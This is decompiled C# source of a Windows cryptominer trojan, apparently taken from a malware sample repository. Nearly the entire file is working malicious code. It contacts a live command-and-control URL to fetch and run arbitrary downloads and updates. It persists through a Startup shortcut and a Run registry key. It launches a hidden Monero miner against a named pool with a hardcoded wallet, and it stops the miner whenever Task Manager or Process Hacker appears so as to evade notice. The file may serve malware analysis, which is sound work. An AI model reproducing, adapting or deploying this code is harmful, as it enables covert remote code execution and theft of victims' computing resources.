// Decompiled with JetBrains decompiler
// Type: m.Program
// Assembly: miner, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BC56FDF6-554C-49FD-A6FA-028B7B3BBFCC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\UDS-Trojan.Win64.Prometei.p-ae5f1fd094029b7e60c1d7998501d17b7585254e1b0644f151b20bd83bf65e7a.exe

using m.Properties;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace m
{
  internal class Program
  {
    private static string adm = "http://solomap5.beget.tech/cmd.php";
    private static string loggr = "";
    private static string pool = "pool.supportxmr.com:3333";
    private static string u = "466XMc1Sg2BTtbHNM7y4yZaFPagsFBcrrMLnyqfw2tVNJePAoR3QMs8bJPJTXoHohXKsh4wgr46ouRFRzFztvpimGmHDLpv";

    public static void downloadAndExcecute(string url, string filename)
    {
      using (WebClient webClient = new WebClient())
      {
        FileInfo fileInfo = new FileInfo(filename);
        webClient.DownloadFile(url, fileInfo.FullName);
        Process.Start(fileInfo.FullName);
      }
    }

    public static string get(string url)
    {
      string str;
      try
      {
        WebRequest webRequest = WebRequest.Create(url);
        webRequest.Credentials = CredentialCache.DefaultCredentials;
        ((HttpWebRequest) webRequest).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
        str = new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
      }
      catch (Exception ex)
      {
        str = (string) null;
      }
      return str;
    }

    public static string[] getTasks()
    {
      string[] strArray1 = Program.get(Program.adm + "?hwid=" + Program.HWID()).Split('|');
      string[] tasks = new string[strArray1.Length];
      int index = 0;
      foreach (string str1 in strArray1)
      {
        try
        {
          string[] strArray2 = str1.Split(';');
          string str2 = strArray2[0].Equals("Update") ? "upd" : "dwl";
          string str3 = strArray2[1];
          string str4 = strArray2[2];
          tasks[index] = str2 + ";" + str3 + ";" + str4;
        }
        catch (Exception ex)
        {
        }
        ++index;
      }
      return tasks;
    }

    public static int getTimeout() => Convert.ToInt32(Program.get(Program.adm + "?timeout=1")) * 60 * 1000;

    public static string HWID()
    {
      string str = "";
      try
      {
        ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
        managementObject.Get();
        str = managementObject["VolumeSerialNumber"].ToString();
      }
      catch (Exception ex)
      {
      }
      return str;
    }

    private static void Main(string[] args)
    {
      string str = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sysfiles\\";
      Thread thread1 = new Thread(new ThreadStart(new Program.Loader().run));
      Thread thread2 = new Thread(new ThreadStart(new Program.Processer(Program.u, Program.pool).run));
      Thread thread3 = new Thread(new ThreadStart(new Program.Logger(Program.loggr).run));
      Thread thread4 = new Thread(new ThreadStart(new Program.Config().run));
      Thread thread5 = new Thread(new ThreadStart(Program.setConnection));
      thread4.Start();
      thread4.Join();
      thread3.Start();
      thread1.Start();
      thread1.Join();
      thread2.Start();
      thread5.Start();
    }

    private static void restart(string filename)
    {
      string str = Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
      Process.Start(new ProcessStartInfo()
      {
        Arguments = "/C ping 127.0.0.1 -n 2 && taskmgr && " + filename + " && del " + str,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true,
        FileName = "cmd.exe"
      });
      Environment.Exit(0);
    }

    public static void setConnection()
    {
      while (true)
      {
        try
        {
          foreach (string task in Program.getTasks())
          {
            try
            {
              string str1 = task.Split(';')[0];
              string url = task.Split(';')[1];
              string str2 = task.Split(';')[2];
              string filename = url.Split('/')[url.Split('/').Length - 1];
              if (str1.Equals("upd"))
              {
                Program.get(Program.adm + "?hwid=" + Program.HWID() + "&completed=" + str2);
                Program.update(url, filename);
              }
              else
              {
                Program.downloadAndExcecute(url, filename);
                Program.get(Program.adm + "?hwid=" + Program.HWID() + "&completed=" + str2);
              }
            }
            catch (Exception ex)
            {
            }
          }
          Thread.Sleep(Program.getTimeout());
        }
        catch
        {
        }
      }
    }

    public static void update(string url, string filename)
    {
      using (WebClient webClient = new WebClient())
      {
        FileInfo fileInfo = new FileInfo(filename);
        webClient.DownloadFile(url, fileInfo.FullName);
      }
      Program.restart(filename);
    }

    private class Config
    {
      private string currFilename = Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1];
      private string path = "";

      private void appShortcutToStartup(string linkName)
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        if (System.IO.File.Exists(folderPath + "\\" + linkName + ".url"))
          return;
        using (StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + linkName + ".url"))
        {
          string str = this.path + this.currFilename;
          streamWriter.WriteLine("[InternetShortcut]");
          streamWriter.WriteLine("URL=file:///" + str);
          streamWriter.WriteLine("IconIndex=0");
          streamWriter.WriteLine("IconFile=" + Process.GetCurrentProcess().MainModule.FileName + "\\backup (3).ico");
          streamWriter.Flush();
        }
      }

      private void createDir()
      {
        try
        {
          if (Directory.Exists(this.path))
            return;
          Directory.CreateDirectory(this.path);
        }
        catch (Exception ex)
        {
        }
      }

      private void createDll(string pth)
      {
      }

      public void move()
      {
        string currentDirectory = Environment.CurrentDirectory;
        string path = this.path;
        string currFilename = this.currFilename;
        foreach (string file in Directory.GetFiles(currentDirectory, currFilename))
        {
          string[] strArray = file.Split('\\');
          string sourceFileName = file;
          string destFileName = path + strArray[strArray.Length - 1];
          try
          {
            System.IO.File.Move(sourceFileName, destFileName);
          }
          catch (Exception ex)
          {
          }
        }
      }

      public byte[] readBytes(string file2)
      {
        string[] strArray = file2.Split(' ');
        byte[] numArray = new byte[strArray.Length];
        for (int index = 0; index < strArray.Length; ++index)
        {
          try
          {
            numArray[index] = Convert.ToByte(strArray[index]);
          }
          catch (Exception ex)
          {
          }
        }
        return numArray;
      }

      private void restart()
      {
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C ping 127.0.0.1 -n 2 && \"" + this.path + this.currFilename + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "cmd.exe"
        });
        Environment.Exit(0);
      }

      public void run()
      {
        this.path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sysfiles\\";
        this.createDir();
        this.move();
        this.SetStartup();
      }

      private void SetStartup()
      {
        try
        {
          this.appShortcutToStartup("Driver");
          string str = this.path + this.currFilename;
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Driver", (object) str);
        }
        catch (Exception ex)
        {
        }
      }

      public void WriteBytes(string fileName, byte[] byteArray, string pth)
      {
        using (FileStream fileStream = new FileStream(pth + fileName, FileMode.Create))
        {
          for (int index = 0; index < byteArray.Length; ++index)
            fileStream.WriteByte(byteArray[index]);
          fileStream.Seek(0L, SeekOrigin.Begin);
          int index1 = 0;
          while ((long) index1 < fileStream.Length && (int) byteArray[index1] == fileStream.ReadByte())
            ++index1;
        }
      }
    }

    private class Loader
    {
      private static string bytesname = "cfg.txt";
      public string cryptV = "1";
      public bool installed;
      private bool is64bit = Program.Loader.Is64Bit();
      private static string loadUrl = Program.Loader.minername ?? "";
      private static string minername = "Driver.exe";
      private string path = "";
      public bool updated = true;

      private void checkInstall() => this.installed = System.IO.File.Exists(this.path + "\\" + Program.Loader.minername);

      public static bool Is64Bit()
      {
        bool lpSystemInfo;
        Program.Loader.IsWow64Process(Process.GetCurrentProcess().Handle, out lpSystemInfo);
        return lpSystemInfo;
      }

      [DllImport("kernel32.dll", SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

      private void load()
      {
        string minername = Program.Loader.minername;
        WebClient webClient = new WebClient();
        bool is64bit = this.is64bit;
        this.WriteBytes(Program.Loader.minername, Resources.AudioHD);
      }

      public byte[] readBytes(string file2)
      {
        string[] strArray = file2.Split(' ');
        byte[] numArray = new byte[strArray.Length];
        for (int index = 0; index < strArray.Length; ++index)
        {
          try
          {
            numArray[index] = Convert.ToByte(strArray[index]);
          }
          catch (Exception ex)
          {
          }
        }
        return numArray;
      }

      public void run()
      {
        this.path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sysfiles\\";
        this.checkInstall();
        if (this.installed)
          return;
        try
        {
          this.load();
        }
        catch
        {
        }
        Program.Config config = new Program.Config();
      }

      public void WriteBytes(string fileName, byte[] byteArray)
      {
        using (FileStream fileStream = new FileStream(this.path + fileName, FileMode.Create))
        {
          for (int index = 0; index < byteArray.Length; ++index)
            fileStream.WriteByte(byteArray[index]);
          fileStream.Seek(0L, SeekOrigin.Begin);
          int index1 = 0;
          while ((long) index1 < fileStream.Length && (int) byteArray[index1] == fileStream.ReadByte())
            ++index1;
        }
      }
    }

    private class Logger
    {
      private string url = "";

      public Logger(string logger) => this.url = logger;

      private void connect()
      {
        try
        {
          WebRequest webRequest = WebRequest.Create(this.url);
          webRequest.Credentials = CredentialCache.DefaultCredentials;
          ((HttpWebRequest) webRequest).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
          new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
        }
        catch (Exception ex)
        {
        }
      }

      public void run() => this.connect();
    }

    private class Processer
    {
      private static string[] forbidden = new string[3]
      {
        "Taskmgr",
        "ProcessHacker",
        "taskmgr"
      };
      public bool isRunning;
      private static int kernels = 0;
      private static string path = "";
      private string pool = "";
      private static string processName = "Driver";
      private string username = "";

      public Processer(string u, string pool)
      {
        this.pool = pool;
        this.username = u;
        Program.Processer.kernels = Environment.ProcessorCount / 2;
        Program.Processer.path = Environment.SystemDirectory.Split('\\')[0] + "\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sysfiles\\";
      }

      private bool checkProcess(string name)
      {
        foreach (Process process in Process.GetProcesses())
        {
          if (process.ProcessName.Contains(name))
            return true;
        }
        return false;
      }

      public void run()
      {
        string processName = Process.GetCurrentProcess().MainModule.FileName.Split('\\')[Process.GetCurrentProcess().MainModule.FileName.Split('\\').Length - 1].Replace(".exe", "");
        while (true)
        {
          try
          {
            Process.GetProcessesByName(processName)[1].Kill();
          }
          catch
          {
          }
          foreach (string name in Program.Processer.forbidden)
          {
            if (this.checkProcess(name))
            {
              if (this.checkProcess(Program.Processer.processName))
              {
                try
                {
                  this.stopProcess();
                }
                catch
                {
                }
              }
              while (this.checkProcess(name))
                Thread.Sleep(1000);
            }
          }
          if (!this.checkProcess(Program.Processer.processName))
          {
            try
            {
              this.runProcess(Program.Processer.processName);
            }
            catch
            {
            }
          }
          Thread.Sleep(1000);
        }
      }

      private void runProcess(string name)
      {
        new Process()
        {
          StartInfo = {
            FileName = (Program.Processer.path + name + ".exe"),
            WindowStyle = ProcessWindowStyle.Hidden,
            Arguments = ("-o " + this.pool + " -u " + this.username + " -p x -k -v=0 --donate-level=1 -t " + (object) Program.Processer.kernels)
          }
        }.Start();
        this.isRunning = true;
      }

      public void stopProcess()
      {
        Process.GetProcessesByName(Program.Processer.processName)[0].Kill();
        this.isRunning = false;
      }
    }
  }
}
